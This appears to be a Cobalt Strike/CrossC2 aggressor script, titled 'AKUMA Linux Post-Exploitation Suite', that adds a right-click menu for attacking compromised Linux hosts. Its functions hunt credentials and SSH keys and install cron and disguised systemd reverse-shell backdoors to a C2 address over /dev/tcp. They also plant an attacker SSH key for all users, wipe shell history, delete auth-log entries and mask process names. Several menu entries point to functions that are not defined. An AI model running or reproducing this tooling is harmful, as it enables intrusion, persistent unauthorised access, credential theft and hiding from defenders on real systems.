@@ -1,0 +1,476 @@
+# AKUMA's Linux Post-Exploitation Automation Suite
+# Created by AKUMA - legendary hacker & pentesting guru
+# Автоматизация post-exploitation для Linux систем через CrossC2
+
+# Глобальные переменные
+global('%akuma_config');
+%akuma_config["c2_server"] = "192.168.1.17";
+%akuma_config["ports"] = @("4444", "5555", "6666", "7777");
+
+# Главное меню
+menubar("AKUMA PostEx", "linux", 1);
+
+popup linux {
+    menu "🔥 AKUMA Linux PostEx" {
+        menu "📋 Reconnaissance" {
+            item "🎯 Quick System Enum" {
+                akuma_quick_enum($1);
+            }
+            item "🔍 Deep System Scan" {
+                akuma_deep_scan($1);
+            }
+            item "🌐 Network Discovery" {
+                akuma_network_discovery($1);
+            }
+            item "🔐 Credential Hunt" {
+                akuma_credential_hunt($1);
+            }
+        }
+        menu "⚡ Privilege Escalation" {
+            item "🚀 Auto PrivEsc Check" {
+                akuma_privesc_check($1);
+            }
+            item "🎯 SUID/SGID Hunt" {
+                akuma_suid_hunt($1);
+            }
+            item "⚙️ Kernel Exploit Check" {
+                akuma_kernel_check($1);
+            }
+        }
+        menu "🔒 Persistence" {
+            item "🕒 Install Cron Backdoors" {
+                akuma_cron_persistence($1);
+            }
+            item "🔑 SSH Key Backdoor" {
+                akuma_ssh_persistence($1);
+            }
+            item "🎭 Service Persistence" {
+                akuma_service_persistence($1);
+            }
+        }
+        menu "📡 Lateral Movement" {
+            item "🔍 Trust Relationship Enum" {
+                akuma_trust_enum($1);
+            }
+            item "🌐 Internal Network Scan" {
+                akuma_internal_scan($1);
+            }
+            item "📋 Share Discovery" {
+                akuma_share_discovery($1);
+            }
+        }
+        menu "💾 Data Collection" {
+            item "🗂️ Sensitive File Hunt" {
+                akuma_file_hunt($1);
+            }
+            item "🌐 Browser Data Extract" {
+                akuma_browser_extract($1);
+            }
+            item "💽 Database Discovery" {
+                akuma_database_discovery($1);
+            }
+        }
+        menu "🧹 Cleanup" {
+            item "🗑️ Clear Logs" {
+                akuma_cleanup_logs($1);
+            }
+            item "👻 Enable Stealth Mode" {
+                akuma_stealth_mode($1);
+            }
+        }
+    }
+}
+
+# ========== RECONNAISSANCE FUNCTIONS ==========
+
+sub akuma_quick_enum {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🔥 AKUMA Quick System Enumeration Starting...");
+    
+    # Базовая информация о системе
+    bshell($bid, "echo '=== AKUMA SYSTEM FINGERPRINT ==='");
+    bshell($bid, "whoami && hostname && pwd");
+    bshell($bid, "uname -a");
+    bshell($bid, "cat /etc/os-release 2>/dev/null || cat /etc/issue");
+    bshell($bid, "uptime && date");
+    
+    # Пользователь и права
+    bshell($bid, "echo '=== USER CONTEXT ==='");
+    bshell($bid, "id && groups");
+    bshell($bid, "sudo -l 2>/dev/null");
+    
+    # Процессы и сеть
+    bshell($bid, "echo '=== RUNNING PROCESSES ==='");
+    bshell($bid, "ps aux --sort=-%cpu | head -10");
+    bshell($bid, "echo '=== NETWORK ==='");
+    bshell($bid, "ip addr show 2>/dev/null || ifconfig");
+    bshell($bid, "ss -tlnp 2>/dev/null || netstat -tlnp");
+    
+    blog($bid, "✅ AKUMA Quick Enumeration Complete!");
+}
+
+sub akuma_deep_scan {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🔍 AKUMA Deep System Scan Starting...");
+    
+    # Создаем скрипт для глубокого сканирования
+    $deep_script = "#!/bin/bash
+echo '🔥 AKUMA DEEP SYSTEM ANALYSIS 🔥'
+echo '======================================='
+
+echo '=== SYSTEM INFO ==='
+uname -a
+hostnamectl 2>/dev/null || hostname -f
+cat /proc/version
+lsb_release -a 2>/dev/null
+
+echo '=== HARDWARE ==='
+lscpu 2>/dev/null | head -10
+free -h
+df -h
+lsblk 2>/dev/null
+
+echo '=== USERS & GROUPS ==='
+cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$'
+cat /etc/group | grep -E '(sudo|wheel|admin)'
+lastlog 2>/dev/null | head -10
+w 2>/dev/null
+
+echo '=== SERVICES ==='
+systemctl list-units --type=service --state=running 2>/dev/null | head -20
+ps aux --sort=-%mem | head -15
+
+echo '=== NETWORK DETAILED ==='
+ip route 2>/dev/null || route -n
+cat /etc/resolv.conf
+arp -a 2>/dev/null | head -20
+ss -anp 2>/dev/null | grep ESTABLISHED | head -15
+
+echo '=== INSTALLED SOFTWARE ==='
+dpkg -l 2>/dev/null | grep -E '(apache|nginx|mysql|postgres|docker)' || rpm -qa 2>/dev/null | grep -E '(apache|nginx|mysql|postgres|docker)'
+
+echo '=== MOUNTS & STORAGE ==='
+mount | grep -v 'tmpfs\\|proc\\|sys'
+cat /etc/fstab | grep -v '^#'
+
+echo '✅ AKUMA Deep Scan Complete!'
+";
+
+    # Записываем скрипт во временный файл и выполняем
+    bshell($bid, "cat > /tmp/.akuma_deep.sh << 'AKUMA_EOF'\n" . $deep_script . "\nAKUMA_EOF");
+    bshell($bid, "chmod +x /tmp/.akuma_deep.sh && /tmp/.akuma_deep.sh && rm -f /tmp/.akuma_deep.sh");
+    
+    blog($bid, "✅ AKUMA Deep Scan Complete!");
+}
+
+sub akuma_network_discovery {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🌐 AKUMA Network Discovery Starting...");
+    
+    # Python скрипт для сетевого сканирования
+    $network_script = "#!/usr/bin/env python3
+import os
+import socket
+import threading
+import ipaddress
+from concurrent.futures import ThreadPoolExecutor
+
+def ping_host(ip):
+    response = os.system(f'ping -c 1 -W 1 {ip} > /dev/null 2>&1')
+    return str(ip) if response == 0 else None
+
+def scan_port(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        result = sock.connect_ex((host, port))
+        sock.close()
+        return port if result == 0 else None
+    except:
+        return None
+
+def main():
+    print('🌐 AKUMA Network Discovery')
+    print('=' * 40)
+    
+    # Get network ranges
+    routes = os.popen(\"ip route | grep -E '^[0-9]' | awk '{print $1}' | grep '/'\").read().strip().split('\\n')
+    
+    for route in routes:
+        if route and '.' in route and '/' in route:
+            try:
+                network = ipaddress.ip_network(route, strict=False)
+                if network.num_addresses <= 256:
+                    print(f'Scanning network: {network}')
+                    
+                    # Ping sweep
+                    alive_hosts = []
+                    with ThreadPoolExecutor(max_workers=50) as executor:
+                        futures = [executor.submit(ping_host, ip) for ip in network.hosts()]
+                        for future in futures:
+                            result = future.result()
+                            if result:
+                                alive_hosts.append(result)
+                    
+                    print(f'Alive hosts ({len(alive_hosts)}): {alive_hosts}')
+                    
+                    # Port scan alive hosts
+                    common_ports = [21,22,23,25,53,80,135,139,443,445,993,995,1433,3389,5432,8080]
+                    for host in alive_hosts[:5]:  # Limit to 5 hosts
+                        open_ports = []
+                        with ThreadPoolExecutor(max_workers=20) as executor:
+                            futures = [executor.submit(scan_port, host, port) for port in common_ports]
+                            for future in futures:
+                                result = future.result()
+                                if result:
+                                    open_ports.append(result)
+                        
+                        if open_ports:
+                            print(f'{host}: {open_ports}')
+            except Exception as e:
+                continue
+
+if __name__ == '__main__':
+    main()
+";
+
+    bshell($bid, "python3 -c \"" . $network_script . "\"");
+    
+    blog($bid, "✅ AKUMA Network Discovery Complete!");
+}
+
+sub akuma_credential_hunt {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🔐 AKUMA Credential Hunt Starting...");
+    
+    $cred_script = "#!/bin/bash
+echo '🔐 AKUMA CREDENTIAL HUNT'
+echo '========================'
+
+echo '=== COMMAND HISTORY ==='
+cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|password\\|secret' | tail -10
+cat ~/.zsh_history 2>/dev/null | grep -i 'pass\\|password\\|secret' | tail -10
+
+echo '=== CONFIG FILES ==='
+find /home -maxdepth 3 -name '*.txt' -o -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10
+
+echo '=== SSH KEYS ==='
+find /home -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name '*.pem' 2>/dev/null
+find /home -name 'authorized_keys' 2>/dev/null | head -5
+
+echo '=== WEB CONFIGS ==='
+find /var/www /opt -name '*.php' -o -name '*.py' -o -name '*.js' 2>/dev/null | xargs grep -l -i 'password\\|passwd' 2>/dev/null | head -10
+
+echo '=== DATABASE CONFIGS ==='
+find /etc /home /var /opt -name 'my.cnf' -o -name 'postgresql.conf' -o -name 'mongod.conf' 2>/dev/null | head -10
+
+echo '=== ENVIRONMENT SECRETS ==='
+env | grep -i 'pass\\|secret\\|key' 2>/dev/null
+printenv | grep -i 'pass\\|secret\\|key' 2>/dev/null
+
+echo '✅ Credential hunt complete!'
+";
+
+    bshell($bid, $cred_script);
+    
+    blog($bid, "✅ AKUMA Credential Hunt Complete!");
+}
+
+# ========== PRIVILEGE ESCALATION FUNCTIONS ==========
+
+sub akuma_privesc_check {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🚀 AKUMA Privilege Escalation Check Starting...");
+    
+    $privesc_script = "#!/bin/bash
+echo '🚀 AKUMA PRIVILEGE ESCALATION VECTORS'
+echo '===================================='
+
+echo '=== SUDO PRIVILEGES ==='
+sudo -l 2>/dev/null
+cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'
+
+echo '=== SUID/SGID BINARIES ==='
+find / -perm -4000 2>/dev/null | head -20
+find / -perm -2000 2>/dev/null | head -20
+
+echo '=== CAPABILITIES ==='
+getcap -r / 2>/dev/null
+/sbin/getcap -r / 2>/dev/null
+
+echo '=== WRITABLE DIRECTORIES ==='
+find / -writable -type d 2>/dev/null | grep -v 'proc\\|sys\\|dev' | head -20
+
+echo '=== CRON JOBS ==='
+cat /etc/crontab 2>/dev/null
+crontab -l 2>/dev/null
+
+echo '=== KERNEL VERSION ==='
+uname -r
+cat /proc/version
+
+echo '=== WORLD-WRITABLE FILES ==='
+find / -perm -002 -type f 2>/dev/null | head -20
+
+echo '✅ PrivEsc check complete!'
+";
+
+    bshell($bid, $privesc_script);
+    
+    blog($bid, "✅ AKUMA PrivEsc Check Complete!");
+}
+
+sub akuma_suid_hunt {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🎯 AKUMA SUID/SGID Hunt Starting...");
+    
+    bshell($bid, "echo '🎯 AKUMA SUID/SGID ANALYSIS'");
+    bshell($bid, "echo '=========================='");
+    bshell($bid, "find / -perm -4000 -exec ls -la {} \\; 2>/dev/null");
+    bshell($bid, "echo '=== SGID BINARIES ==='");
+    bshell($bid, "find / -perm -2000 -exec ls -la {} \\; 2>/dev/null");
+    bshell($bid, "echo '=== CAPABILITIES ==='");
+    bshell($bid, "getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null");
+    
+    blog($bid, "✅ AKUMA SUID Hunt Complete!");
+}
+
+sub akuma_kernel_check {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "⚙️ AKUMA Kernel Exploit Check Starting...");
+    
+    bshell($bid, "echo '⚙️ AKUMA KERNEL ANALYSIS'");
+    bshell($bid, "echo '======================'");
+    bshell($bid, "uname -a");
+    bshell($bid, "cat /proc/version");
+    bshell($bid, "lsb_release -a 2>/dev/null");
+    bshell($bid, "cat /etc/issue");
+    bshell($bid, "dmesg 2>/dev/null | grep -i 'linux version' | head -5");
+    
+    blog($bid, "✅ AKUMA Kernel Check Complete!");
+}
+
+# ========== PERSISTENCE FUNCTIONS ==========
+
+sub akuma_cron_persistence {
+    local('$bid', '$server', '$port1', '$port2');
+    $bid = $1;
+    $server = %akuma_config["c2_server"];
+    $port1 = %akuma_config["ports"][0];
+    $port2 = %akuma_config["ports"][1];
+    
+    blog($bid, "🕒 AKUMA Installing Cron Backdoors...");
+    
+    # Множественные cron backdoor'ы
+    bshell($bid, "(crontab -l 2>/dev/null; echo \"*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . $port1 . " 0>&1'\") | crontab -");
+    bshell($bid, "(crontab -l 2>/dev/null; echo \"@reboot sleep 60 && /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . $port2 . " 0>&1'\") | crontab -");
+    
+    # System-wide cron (если root)
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo \"*/20 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . $port1 . " 0>&1'\" >> /etc/crontab; fi");
+    
+    blog($bid, "✅ AKUMA Cron Backdoors Installed!");
+}
+
+sub akuma_ssh_persistence {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🔑 AKUMA Installing SSH Backdoor...");
+    
+    $ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7VjXqGq1pF8K3J9j2M5+QrP3fF7e8A9fE2c1vG8H4N5M6L7akuma@c2";
+    
+    bshell($bid, "mkdir -p ~/.ssh 2>/dev/null");
+    bshell($bid, "echo '" . $ssh_key . "' >> ~/.ssh/authorized_keys 2>/dev/null");
+    bshell($bid, "chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
+    bshell($bid, "chmod 700 ~/.ssh 2>/dev/null");
+    
+    # Если root, добавить для всех пользователей
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then find /home -name '.ssh' -type d -exec sh -c 'echo \"" . $ssh_key . "\" >> \"$1/authorized_keys\"' _ {} \\; 2>/dev/null; fi");
+    
+    blog($bid, "✅ AKUMA SSH Backdoor Installed!");
+}
+
+sub akuma_service_persistence {
+    local('$bid', '$server', '$port');
+    $bid = $1;
+    $server = %akuma_config["c2_server"];
+    $port = %akuma_config["ports"][2];
+    
+    blog($bid, "🎭 AKUMA Installing Service Persistence...");
+    
+    $service_content = "[Unit]
+Description=System Backup Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do sleep 300; /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"; done'
+Restart=always
+User=nobody
+
+[Install]
+WantedBy=multi-user.target";
+
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then cat > /etc/systemd/system/system-backup.service << 'EOF'\n" . $service_content . "\nEOF; systemctl enable system-backup.service 2>/dev/null; systemctl start system-backup.service 2>/dev/null; fi");
+    
+    blog($bid, "✅ AKUMA Service Persistence Installed!");
+}
+
+# ========== CLEANUP FUNCTIONS ==========
+
+sub akuma_cleanup_logs {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🗑️ AKUMA Cleaning Logs...");
+    
+    bshell($bid, "history -c");
+    bshell($bid, "unset HISTFILE");
+    bshell($bid, "export HISTFILE=/dev/null");
+    bshell($bid, "> ~/.bash_history 2>/dev/null");
+    bshell($bid, "> ~/.zsh_history 2>/dev/null");
+    
+    # Попытка очистить system logs (если есть права)
+    bshell($bid, "if [ -w /var/log/auth.log ]; then sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; fi");
+    bshell($bid, "if [ -w /var/log/secure ]; then sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null; fi");
+    
+    blog($bid, "✅ AKUMA Log Cleanup Complete!");
+}
+
+sub akuma_stealth_mode {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "👻 AKUMA Enabling Stealth Mode...");
+    
+    # Переименование процесса
+    bshell($bid, "exec -a \"systemd-user\" bash");
+    
+    # Настройка environment для скрытия
+    bshell($bid, "export PS_FORMAT=\"pid,ppid,user,comm\"");
+    bshell($bid, "export HISTFILE=/dev/null");
+    bshell($bid, "unset HISTFILE");
+    
+    blog($bid, "✅ AKUMA Stealth Mode Enabled!");
+}
+
+# Сообщение о загрузке
+println("🔥 AKUMA Linux Post-Exploitation Suite Loaded!");
+println("   Created by AKUMA - legendary hacker & pentesting guru");
+println("   Available in beacon right-click menu under 'AKUMA PostEx'");
+println("   🎯 Features: Auto enum, PrivEsc, Persistence, Lateral movement");
+println("   ⚡ Ready to pwn Linux systems!");
